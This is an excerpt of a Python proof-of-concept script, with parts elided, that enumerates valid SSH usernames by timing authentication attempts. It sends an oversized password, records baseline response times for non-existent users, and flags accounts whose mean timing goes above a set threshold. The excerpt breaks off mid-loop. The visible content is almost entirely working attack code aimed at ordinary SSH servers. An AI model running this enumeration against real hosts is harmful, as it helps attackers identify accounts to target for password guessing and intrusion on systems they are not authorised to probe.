...
import paramiko
import time
import numpy as np  # Updated for standard alias
import argparse
import sys
...
def connect(host, port, user):
    global args
    starttime = time.perf_counter()  # Use perf_counter for better precision
    p = 'B' * int(args.bytes)
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
...
def main():
    ...
    if not args.silent:
        ...
        print("Created and coded by 0_o (nu11.nu11 [at] yahoo.com), PoC by Eddie Harari\n\n")

    host = args.host.split(":")[0]
    port = int(args.host.split(":")[1]) if ":" in args.host else 22
    ...
    if args.user:
        ...
        if not args.silent:
            print(bcolors.FAIL + "[!] " + bcolors.ENDC + "You must give a user or a list of users")
        sys.exit()

    if not args.silent:
        print(bcolors.OKBLUE + "[*] " + bcolors.ENDC + "Testing SSHD at: " + bcolors.BOLD + str(host) + ":" + str(port) + bcolors.ENDC + ", Banner: " + bcolors.BOLD + get_banner(host, port) + bcolors.ENDC)

    # Get baseline timing for non-existing users
    baseline_samples = []
    if not args.silent:
        sys.stdout.write(bcolors.OKBLUE + "[*] " + bcolors.ENDC + "Getting baseline timing for authenticating non-existing users")
    ...
    baseline_samples.pop()  # Remove the max
    baseline_samples.pop(0)  # Remove the min

    # Calculate mean and deviation
    baseline_mean = np.mean(baseline_samples)
    baseline_deviation = np.std(baseline_samples)

    if not args.silent:
        print(bcolors.OKBLUE + "[*] " + bcolors.ENDC + "Baseline mean for host " + host + " is " + str(baseline_mean) + " seconds.")
        print(bcolors.OKBLUE + "[*] " + bcolors.ENDC + "Baseline variation for host " + host + " is " + str(baseline_deviation) + " seconds.")

    upper = baseline_mean + float(args.factor) * baseline_deviation
    if not args.silent:
        print(bcolors.WARNING + "[*] " + bcolors.ENDC + "Defining timing of x < " + str(upper) + " as non-existing user.")
        print(bcolors.OKBLUE + "[*] " + bcolors.ENDC + "Testing your users...")
    ...
    for u in users:
        ...
        enum_mean = np.mean(enum_samples)
        if enum_mean < upper:
